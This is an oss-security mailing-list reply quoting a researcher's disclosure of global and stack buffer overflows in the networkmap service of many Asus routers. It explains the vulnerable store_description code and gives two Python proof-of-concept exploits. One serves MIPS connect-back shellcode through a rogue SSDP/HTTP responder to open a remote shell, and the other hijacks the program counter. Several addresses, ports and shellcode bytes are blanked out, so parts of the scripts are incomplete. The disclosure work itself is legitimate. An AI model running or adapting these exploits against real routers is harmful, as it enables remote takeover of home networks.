  oss-security - Re: Re: Asus wireless routers Global buffer overflow and Stack buffer overflow in networkmap            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [day] [month] [year] [list]  Date: Mon, 17 Jul From: GbigMao <gbigmao@...com> To: oss-security <oss-security@...ts.openwall.com> Cc: "Zach W" <kestrel@...linux.us> Subject: Re: Re: Asus wireless routers Global buffer overflow and Stack buffer overflow in networkmap  Use and .    GbigMao.   From: Zach W Date: To: oss-security; 逢坂河河、、 Subject: Re: [oss-security] Asus wireless routers Global buffer overflow and Stack buffer overflow in networkmap Is this different from   Zach W.     On AM, 逢坂河河、、 wrote: > ============================================================= >                                                Global buffer overflow > ============================================================= > > [Vulnerability]: > Global buffer overflow in networkmap > > > ------------------------------------------ > [Exploitation]: > Can write data at any address in heap > > > ------------------------------------------ > [Vendor of Product]: > Asus wireless router > > > ------------------------------------------ > [Affected Products and firmware version]: > Asuswrt-Merlin ,all the firmware and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > RT-AC68U ,all the firmware,and the latest firmware is > RT-AC68P ,all the firmware,and the latest firmware is > RT-AC88U ,all the firmware,and the latest firmware is > RT-AC66U ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > RT-AC58U ,all the firmware,and the latest firmware is > RT-AC56U ,all the firmware,and the latest firmware is > RT-AC55U ,all the firmware,and the latest firmware is > RT-AC52U ,all the firmware,and the latest firmware is > RT-AC51U ,all the firmware,and the latest firmware is > RT-N18U ,all the firmware,and the latest firmware is > RT-N66U ,all the firmware,and the latest firmware is > RT-N56U ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > RT-AC53 ,all the firmware,and the latest firmware is > RT-N12HP ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > RT-N12+ ,all the firmware,and the latest firmware is > RT_N12+_PRO ,all the firmware,and the latest firmware is > RT-N16 ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > > > ------------------------------------------ > [Attack Type]: > Remote > > > ------------------------------------------ > [Can Cause Denial of Service?]: > yes > > > ------------------------------------------ > [Reference]: > > http://asuswrt.lostrealm.ca/ >  (chose the others can download the firmware sourcecode) > https://www.asus.com/Networking/Wireless-Routers-Products/ > > > ------------------------------------------ > [Discoverer]: > Tianfeng Guan, pkav of Sichuan Silent Information Technology Company Ltd, http://www.silence.com.cn/ > > > ------------------------------------------ > [Affected components]: > Affected executable application: networkmap > Affected source code file: \release\src\router\networkmap\function.c > Affected function: store_description(char *msg) > > > ------------------------------------------ > [Vulnerability description]: > When the function process_device_repsonse of networkmap is parsing the  > SSDP answer from a device and the SSDP answer has indicated the location like: > HTTP/1.1 OK > Location:HTTP://host:port/path > If the "HTTP://host:port/path" is valid, the networkmap will get the  > device descirption xml by accessing "HTTP://host:port/path",and it will use  > the function store_description to store the device descirption information  > to global sturct device_info. > In the function store_description,there's no limit to the variable s_num, > so that it can cause the global sturct device_info overflow when copy the > data from tmp to description.service[s_num].url . > > > ------------------------------------------ > [Vulnerability details]: > In the \release\src\router\networkmap\function.c, > It define the global struct device_info description and the function store_description: > ... > struct device_info description; > ... > void store_description(char *msg) > { > ... >         int s_num = 0; > ... > while( p!= NULL && p < body) >         { > ... > switch(type) > { > ... >         case 7: >             strlcpy(description.service[s_num].url, tmp, sizeof(description.service[s_num].url)); >             NMP_DEBUG_F("service %d url = %s\n", s_num, tmp); >             s_num++; >             break; >         } >         } >         ... > } > > > You can see that the s_num variable is incremented in case 7, > But in the while( p!= NULL && p < body),it never check the s_num variable. > And in the \release\src\router\networkmap\networkmap.h,it define the struct device_info: > ... > #define LINE_SIZE               > #define SERVICE_NUM             10 > struct service > { >         char name[LINE_SIZE]; >         char url[LINE_SIZE]; > }; > struct device_info > { >         char friendlyname[LINE_SIZE]; >         char manufacturer[LINE_SIZE]; >         char description[LINE_SIZE]; >         char modelname[LINE_SIZE]; >         char modelnumber[LINE_SIZE]; >         char presentation[LINE_SIZE]; >         struct service service[SERVICE_NUM]; >         int service_num; > }; > > > Because SERVICE_NUM = 10,so,in the case 7 which in the function store_description,  > when the s_num variable has be incremented and the s_num > 10, > the data copy to struct device_info description.service[s_num].url will overflow. > > > ------------------------------------------ > [Exploitation details]: > When the networkmap get the device descirption xml by accessing "HTTP://host:port/path", > we can respond a device descirption xml like: > <?xml><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL><><SCPDURL>shellcode<></root> > the shellcode will be written to the memory that out of the global struct device_info description. > > > And then,because the memory maps for networkmap is: > cat /proc/$(pidof networkmap)/maps > r-xp        /usr/sbin/networkmap > rw-p        /usr/sbin/networkmap > rwxp 0          [heap] > r-xp        /lib/ld-uClibc.so.0 > rw-p 0  > rw-s 0          (deleted) > rw-s      (deleted) > r--p        /lib/ld-uClibc.so.0 > rw-p        /lib/ld-uClibc.so.0 > r-xp        /usr/lib/libshared.so > ---p 0  > rw-p        /usr/lib/libshared.so > rw-p 0  > r-xp        /usr/lib/libnvram.so > ---p 0  > rw-p        /usr/lib/libnvram.so > r-xp        /lib/libgcc_s.so.1 > ---p 0  > rw-p        /lib/libgcc_s.so.1 > r-xp        /lib/libc.so.0 > ---p 0  > rw-p        /lib/libc.so.0 > rw-p 0  > r--s        /dev/nvram > rwxp 0          [stack] > r-xp 0          [vdso] > > > Both the Program address and the Heap address are not randomized and Continuous. > So when the global struct device_info overflow ,the shellcode could be write to  > the heap ,and the shellcode address in the heap is fixed and Controllable. > > > ------------------------------------------ > [exp.py]: > # Tested product and firmware version: > # > > > # coding=utf-8 > > > ROUTER_IP =     #asus wireless router ip > IP =         #attacker ip > INTERACE = 'eth0'     #attacker host network interface > CONNECTBACK_IP = #the host ip use for connectback shell shellcode > #the default connectback port is >                                  > import time > import socket > import sys > import os > import threading > import socketserver > > > sc = '<?xml><SCPDURL>' > sc += '<>' > sc += '<SCPDURL>' > sc += '<>' > sc += '<SCPDURL>' > sc += '<>' > sc += '<SCPDURL>' > sc += '<>' > sc += '<SCPDURL>' > sc += '<>' > sc += '<SCPDURL>' > sc += '<>' > sc += '<SCPDURL>' > sc += '<>' > sc += '<SCPDURL>' > sc += '<>' > sc += '<SCPDURL>' > sc += '<>' > sc += '<SCPDURL>' > sc += '<>' > sc += '<SCPDURL>' > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += b'\xff\xff\xa2\xaf' > sc += b'\xff\xff\xa4\x8f' > sc += > sc += > sc += > sc += > sc += b'\xe4\xff\xae\xa7' > sc += socket.inet_aton(CONNECTBACK_IP)[0] + socket.inet_aton(CONNECTBACK_IP)[1] + > sc += b'\xe6\xff\xae\xa7' > sc += socket.inet_aton(CONNECTBACK_IP)[2] + socket.inet_aton(CONNECTBACK_IP)[3] + > sc += b'\xe8\xff\xae\xa7' > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += > sc += b'\xec\xff\xaf\xa7' > sc += > sc += b'\xee\xff\xaf\xa7' > sc += > sc += b'\xf0\xff\xae\xa7' > sc += > sc += b'\xf2\xff\xae\xa7' > sc += b'\xf4\xff\xa0\xaf' > sc += > sc += b'\xf8\xff\xa4\xaf' > sc += b'\xfc\xff\xa0\xaf' > sc += > sc += > sc += > sc += '<></root>' > > > def mac(): >     os.system('macchanger -A {}'.format(INTERACE)) > > > os.system('ifconfig {} down; ifconfig {} {} up; route add default gw {};'.format(INTERACE, INTERACE, IP, ROUTER_IP)) > > > class ThreadedHTTPRequestHandler(socketserver.BaseRequestHandler): > > >     def handle(self): >         print('[-] got shellcode request') >         >         print("[-] sending shellcode") >         self.request.send(sc) > > > class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer): >     pass > > > socketserver.TCPServer.allow_reuse_address = True > server = ThreadedHTTPRequestHandler) > t = threading.Thread(target=server.serve_forever) > t.start() > > > print("[-] Please opens a new terminal and use ping ROUTER_IP to Speed up SSDP network interaction") > > > addrinfo = None)[0] > s = socket.socket(addrinfo[0], socket.SOCK_DGRAM) > s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) > > s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(addrinfo[4][0]) + > > > mac() > times = 0 > state = 'Overflow' > > > while True: >     data, sender = >     if sender[0] == ROUTER_IP and sender[1] == >         print("[-] received SSDP M-SEARCH Package") > > >         data = {} >         data['Overflow'] = b'HTTP/1.1 OK\r\nLocation:HTTP://' + IP.encode() + > > >         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) >         sock.sendto(data[state], sender) > > >         if state == 'Overflow': >             print("[-] Send the GetXmlRequest to router") >             time.sleep(20) >             os._exit(0) > > > > ============================================================= >                                                Stack buffer overflow > ============================================================= > > > [Vulnerability]: > Stack buffer overflow in networkmap > > > ------------------------------------------ > [Exploitation]: > Can control the $pc. > Together with the above Global buffer overflow vulnerability, > can remote code execution and then get a connectback shell.  > > > ------------------------------------------ > [Vendor of Product]: > Asus wireless router > > > ------------------------------------------ > [Affected Products and firmware version]: > Asuswrt-Merlin ,all the firmware and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > RT-AC68U ,all the firmware,and the latest firmware is > RT-AC68P ,all the firmware,and the latest firmware is > RT-AC88U ,all the firmware,and the latest firmware is > RT-AC66U ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > RT-AC58U ,all the firmware,and the latest firmware is > RT-AC56U ,all the firmware,and the latest firmware is > RT-AC55U ,all the firmware,and the latest firmware is > RT-AC52U ,all the firmware,and the latest firmware is > RT-AC51U ,all the firmware,and the latest firmware is > RT-N18U ,all the firmware,and the latest firmware is > RT-N66U ,all the firmware,and the latest firmware is > RT-N56U ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > RT-AC53 ,all the firmware,and the latest firmware is > RT-N12HP ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > RT-N12+ ,all the firmware,and the latest firmware is > RT_N12+_PRO ,all the firmware,and the latest firmware is > RT-N16 ,all the firmware,and the latest firmware is > ,all the firmware,and the latest firmware is > > > ------------------------------------------ > [Attack Type]: > Remote > > > ------------------------------------------ > [Can Cause Denial of Service?]: > yes > > > ------------------------------------------ > [Reference]: > > http://asuswrt.lostrealm.ca/ >  (chose the others can download the firmware sourcecode) > https://www.asus.com/Networking/Wireless-Routers-Products/ > > > ------------------------------------------ > [Discoverer]: > Tianfeng Guan, pkav of Sichuan Silent Information Technology Company Ltd, http://www.silence.com.cn/ > > > ------------------------------------------ > [Affected components]: > Affected executable application: networkmap > Affected source code file: \release\src\router\networkmap\function.c > Affected function: store_description(char *msg) > > > ------------------------------------------ > [Vulnerability details]: > When the function process_device_repsonse of networkmap is parsing the SSDP answer  > from a device and the SSDP answer has indicated the location like: > HTTP/1.1 OK > Location:HTTP://host:port/path > If the "HTTP://host:port/path" is valid, the networkmap will get the device descirption  > xml by accessing "HTTP://host:port/path",and it will use the function store_description  > to store the device descirption information to global sturct device_info. > > > In the switch case 6 which in the function store_description: > > >     case 6: // tmp="urn:schemas-upnp-org:service:serviceType:v" > mxend = tmp; > i = 0; j = 0; > while(i != 4) > { > if(i == 3) > tmp[j++] = *mxend; > if(*mxend == ':') > i++; > mxend++; > } > tmp[j-1] = '\0'; > strlcpy(description.service[s_num].name, tmp, sizeof(description.service[s_num].name)); > NMP_DEBUG_F("service %d name = %s\n", s_num, tmp); > break; >  > if it couldn't found the fourth ':' in the stack, the stack buffer tmp will be overflow,  > and this stack-based overflow can be used to gain control over networkmap’s control flow  > by overwriting the saved $ra stored on the stack. > > > ------------------------------------------ > [Exploitation details]: > when answer the SSDP request, we can send the SSDP answer message like: > 'HTTP/1.1 + + + '\r\n\r\n' > And When the networkmap get the device descirption xml by accessing > we can respond a device descirption xml like: > <?xml><serviceType>AAAA<></root> > And then, after the code in case 6,the stack buffer tmp will be overflow,and the  > data start from stack buffer tmp will become + > and it lead to the $ra and $pc being set to > > > Now we can control the $pc by overwriting the saved $ra stored on the stack.  > For further exploitation,to get a ConnectBack shell,we can use the "Write data > at any address in heap" vulnerability which also in function store_description, > to write the ConnectBack shell shellcode on a fixed heap address,and then we  > can use this Code Execution vulnerability to let $pc be set as the ConnectBack shell shellcode address. > > > ------------------------------------------ > [exp.py]: > # Tested product and firmware version: > # > > > # coding=utf-8 > > > ROUTER_IP =     #asus wireless router ip > IP =         #attacker ip > INTERACE = 'eth0'     #attacker host network interface > > > import time > import socket > import sys > import os > import threading > import socketserver > > > sc = '<?xml>' > sc += '<serviceType>' > sc += b'AAAA' * 49 > sc += 'AA<></root>' > > > def mac(): >     os.system('macchanger -A {}'.format(INTERACE)) > > > os.system('ifconfig {} down; ifconfig {} {} up; route add default gw {};'.format(INTERACE, INTERACE, IP, ROUTER_IP)) > > > class ThreadedHTTPRequestHandler(socketserver.BaseRequestHandler): > > >     def handle(self): >         print('[-] got xml request') >         >         print("[-] sending xml") >         self.request.send(sc) > > > class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer): >     pass > > > socketserver.TCPServer.allow_reuse_address = True > server = ThreadedHTTPRequestHandler) > t = threading.Thread(target=server.serve_forever) > t.start() > > > print("[-] Please opens a new terminal and use ping ROUTER_IP to Speed up SSDP network interaction") > > > addrinfo = None)[0] > s = socket.socket(addrinfo[0], socket.SOCK_DGRAM) > s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) > > s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(addrinfo[4][0]) + > > > mac() > times = 0 > state = 'Overflow' > > > while True: >     data, sender = >     if sender[0] == ROUTER_IP and sender[1] == >         print("[-] received SSDP M-SEARCH Package") > > >         data = {} >         data['Overflow'] = b'HTTP/1.1 OK\r\nLocation:HTTP://' + IP.encode() + + + + '\r\n\r\n' > > >         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) >         sock.sendto(data[state], sender) > > >         if state == 'Overflow': >             print("[-] Send the GetXmlRequest to router") >             time.sleep(20) >             os._exit(0)    Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      